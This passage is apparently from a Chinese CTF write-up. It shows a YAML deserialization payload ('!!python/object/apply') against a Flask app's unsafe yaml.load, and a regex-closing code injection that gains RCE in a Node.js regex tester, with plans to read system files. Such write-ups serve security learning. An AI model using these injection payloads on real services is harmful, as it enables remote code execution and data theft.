<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><span style="font-size: 15px;">用从不可信来源接收的任何数据调用&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">yaml.load</span></code><span style="font-size: 15px;">&nbsp;是不安全的！</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">yaml.load</span></code><span style="font-size: 15px;">&nbsp;和&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">pickle.load</span></code><span style="font-size: 15px;">&nbsp;一样强大，因此<strong style="box-sizing: border-box;">可以调用任何 Python 函数</strong>。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><span style="font-size: 15px;">既然&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">yaml.load</span></code><span style="font-size: 15px;">&nbsp;可以调用任何 Python 函数，那我们可以不用想办法创建 whale 去使之与&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">EASTER_WHALE</span></code><span style="font-size: 15px;">&nbsp;相等，直接&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">flag.get_flag()</span></code><span style="font-size: 15px;">&nbsp;即可。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><span style="font-size: 15px;">结合题目代码：</span></p>
<pre style="box-sizing: border-box;font-size: 1em;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">&nbsp;@staticmethod</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">from_configuration</span>(config):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;Wheel(**yaml.load(config,&nbsp;Loader=yaml.Loader))<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><span style="font-size: 15px;">这里的&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">yaml.load</span></code><span style="font-size: 15px;">&nbsp;从 config 中读取 yaml 文件创建 wheel 对象，加上&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">Loader=yaml.Loader</span></code><span style="font-size: 15px;">&nbsp;只是为了避免警告。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><span style="font-size: 15px;">而 config 则是来自我们 post 的表单数据：</span></p>
<pre style="box-sizing: border-box;font-size: 1em;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;request.method&nbsp;==&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;POST&quot;</span>:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;config&quot;</span>&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">in</span>&nbsp;request.form:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wheel&nbsp;=&nbsp;Wheel.from_configuration(request.form[<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;config&quot;</span>])<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><span style="font-size: 15px;">到这里思路就很明晰了，我们从路由 wheel post config 对象，config 的 name 用我们精心构造的可以&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">flag.get_flag()</span></code><span style="font-size: 15px;">&nbsp;的语句，其他参数因为是数字类型所以随便写即可。</span></p>
</blockquote>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">我们先要想办法序列化一个对象传入&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">yaml.load</span></code><span style="font-size: 15px;">&nbsp;，而对应官方文档有：</span></p>
<blockquote style="box-sizing: border-box;margin-top: 20px;margin-bottom: 20px;border-top: none;border-right: none;border-bottom: none;border-left-color: rgba(0, 0, 0, 0.4);font-size: 0.9em;overflow: auto;background: rgba(0, 0, 0, 0.05);color: rgb(106, 115, 125);padding: 10px 10px 10px 20px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;"><p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">!!python/object:module.Class { attribute: value, ... }</span></code></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><span style="font-size: 15px;">任何可选对象都可以使用&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">!!python/object</span></code><span style="font-size: 15px;">&nbsp;进行序列化。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><span style="font-size: 15px;">为了支持 pickle 协议，还提供了两种额外形式。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">!!python/object/new:module.Class [argument, ...]</span></code></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">!!python/object/apply:module.function [argument, ...]</span></code></p>
<pre style="box-sizing: border-box;font-size: 1em;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">&gt;&gt;&gt;&nbsp;</span><span style="box-sizing: border-box;line-height: 26px;">class&nbsp;<span style="line-height: 26px;">Hero</span>:</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">...&nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">__init__</span>(self,&nbsp;name,&nbsp;hp,&nbsp;sp):</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">...&nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.name&nbsp;=&nbsp;name<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">...&nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.hp&nbsp;=&nbsp;hp<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">...&nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.sp&nbsp;=&nbsp;sp<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">...&nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">__repr__</span>(self):</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">...&nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;%s(name=%r,&nbsp;hp=%r,&nbsp;sp=%r)&quot;</span>&nbsp;%&nbsp;(<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">...&nbsp;</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.__class__.__name__,&nbsp;self.name,&nbsp;self.hp,&nbsp;self.sp)<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">&gt;&gt;&gt;&nbsp;</span>yaml.load(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;&quot;&quot;<br style="box-sizing: border-box;"/><span style="line-height: 26px;">...&nbsp;</span>!!python/object:__main__.Hero<br style="box-sizing: border-box;"/><span style="line-height: 26px;">...&nbsp;</span>name:&nbsp;Welthyr&nbsp;Syxgon<br style="box-sizing: border-box;"/><span style="line-height: 26px;">...&nbsp;</span>hp:&nbsp;1200<br style="box-sizing: border-box;"/><span style="line-height: 26px;">...&nbsp;</span>sp:&nbsp;0<br style="box-sizing: border-box;"/><span style="line-height: 26px;">...&nbsp;</span>&quot;&quot;&quot;</span>)<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>Hero(name=<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;Welthyr&nbsp;Syxgon&#39;</span>,&nbsp;hp=<span style="box-sizing: border-box;color: #008080;line-height: 26px;">1200</span>,&nbsp;sp=<span style="box-sizing: border-box;color: #008080;line-height: 26px;">0</span>)<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><span style="font-size: 15px;">如上例，Hero 类有三个属性 name、hp、sp ，我们可以通过&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">!!python/object</span></code><span style="font-size: 15px;">&nbsp;利用&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">yaml.load</span></code><span style="font-size: 15px;">&nbsp;成功序列化出来。</span></p>
</blockquote>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">所以我们可以构造 payload 如下：</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;">config={name:&nbsp;!!python/object/apply:flag.get_flag&nbsp;[],&nbsp;image_num:&nbsp;3,&nbsp;diameter:&nbsp;3}<br style="box-sizing: border-box;"/></code></pre>
<p style="text-align: center;"><img class="rich_pages js_insertlocalimg" style="" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-148890-16073952651.png"/></p>
<h2 style="box-sizing: border-box;margin-top: 30px;margin-bottom: 15px;color: rgb(0, 0, 0);font-weight: bold;font-size: 22px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: border-box;font-size: 15px;">CSRegex</span></h2>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">页面是正则表达式测试工具。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">nodejs 笔者没有相关开发经验，写的可能有所欠缺，所以下文仅作为参考。</span></p>
<p style="text-align: center;"><img class="rich_pages js_insertlocalimg" style="" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-148890-1607395266.png"/></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">我们应首先判断这个网站是用什么写的，当然 ctf 首先想到的是 node ，这种类似的题在 picoCTF见过，这里摆出来只是为了介绍一下，判断 node 简便的方法有两种：</span></p>
<ul style="margin-top: 8px;margin-bottom: 8px;padding-left: 25px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;font-size: 16px;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);" class=" list-paddingleft-2">
<li>
<section style="box-sizing: border-box;margin-top: 5px;margin-bottom: 5px;line-height: 26px;color: rgb(1, 1, 1);"><span style="font-size: 15px;">当访问一个不存在的路径时，会得到 node 错误 “ Can not GET/whatever” ，响应头部有&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">X-Powered-By: Express</span></code><span style="font-size: 15px;">&nbsp;（ Express 框架开发）</span></section>
</li>
<li>
<section style="box-sizing: border-box;margin-top: 5px;margin-bottom: 5px;line-height: 26px;color: rgb(1, 1, 1);"><span style="font-size: 15px;">利用&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">Wappalyzer</span></code><span style="font-size: 15px;">&nbsp;之类的插件了解网站所用技术</span></section>
</li>
</ul>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">但明显不能用到这里：</span></p>
<p style="text-align: center;"><img class="rich_pages js_insertlocalimg" style="" src="https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-148890-1607395267.png"/></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><br/></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">作为第二种方式的代替，我比赛时找到了 https://builtwith.com/</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">发现了 underscore.js ，nodejs 库。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">同时&nbsp;</span><span style="font-size: 15px;">国外师傅</span><span style="font-size: 15px;">&nbsp;是利用&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">fetch</span></code><span style="font-size: 15px;">&nbsp;是否定义来判断该网站是运行在 node 上还是浏览器上的：</span></p>
<blockquote style="box-sizing: border-box;margin-top: 20px;margin-bottom: 20px;border-top: none;border-right: none;border-bottom: none;border-left-color: rgba(0, 0, 0, 0.4);font-size: 0.9em;overflow: auto;background: rgba(0, 0, 0, 0.05);color: rgb(106, 115, 125);padding: 10px 10px 10px 20px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;"><p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;">&quot;fetch is not defined&quot; -- we are running on node and not a web browser</p>
</blockquote>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">通过观察 JavaScript Code ，我们可以先闭合掉前面的正则表达式，试着拼接一些命令来获取更多信息，最后再注释掉：</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">//&nbsp;test</span><br style="box-sizing: border-box;"/>w/gi);<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">let</span>&nbsp;a=<span style="box-sizing: border-box;color: #008080;line-height: 26px;">10</span>;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;a;<span style="box-sizing: border-box;color: #009926;line-height: 26px;">/<br style="box-sizing: border-box;"/>------<br style="box-sizing: border-box;"/>&#39;123&#39;.match(/</span>w/gi);<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">let</span>&nbsp;a=<span style="box-sizing: border-box;color: #008080;line-height: 26px;">10</span>;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;a;<span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">//gi)</span><br style="box-sizing: border-box;"/>------<br style="box-sizing: border-box;"/>{&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;result&quot;</span>:&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">10</span>&nbsp;}<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">既然有了 RCE ，我们先来考虑读系统文件该怎么构造 payload ，node 有 fs 模块用于对系统文件及目录进行读写操作，需要用&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">require(&#39;fs&#39;)</span></code><span style="font-size: 15px;">&nbsp;来载入，但<strong style="box-sizing: border-box;">上下文</strong>里不一定有&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">require</span></code><span style="font-size: 15px;">&nbsp;，</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">require</span></code><span style="font-size: 15px;">&nbsp;并不是可以全局访问的。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">见&nbsp;</span><span style="font-size: 15px;">官方文档</span><span style="font-size: 15px;">&nbsp;和&nbsp;</span><span style="font-size: 15px;">示例</span><span style="font-size: 15px;">&nbsp;：</span></p>
